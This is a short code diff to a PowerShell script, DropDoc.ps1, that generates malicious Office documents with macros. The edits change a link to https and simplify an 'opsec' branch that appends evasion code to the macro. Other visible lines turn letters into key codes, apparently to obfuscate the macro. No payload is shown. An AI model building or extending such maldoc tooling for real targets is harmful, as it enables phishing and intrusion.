@@ -22,7 +22,7 @@ Final name for the maldoc.
 PS > .\DropDoc.ps1 docname
 
 .LINK
-http://tuxtrack.github.io/
+https://tuxtrack.github.io/
 https://github.com/tuxtrack/
 #>
 
@@ -109,7 +109,6 @@ Function CreateDoc(){
 
     $a = $a.ToCharArray()
 
-    
     $a = $a -replace "A" , "65"	    #The A key.
     $a = $a -replace "B" , "66"	    #The B key.
     $a = $a -replace "C" , "67"	    #The C key.
@@ -194,14 +193,11 @@ Function CreateDoc(){
     $MacroCode = $MacroCode -replace 'randomfile', $randomvar
 
     
-    If (($opsec -eq "Yes") -and ($StoneChecks -eq "Stone")){
+    If ($opsec -eq "Yes"){
 
-        $MacroCode += $Stone
-    }
-
-    Elseif (($opsec -eq "Yes") -and ($StoneChecks -eq "NonStone")){
 
         $MacroCode += $NonStone
+    
     }
 
     Else {
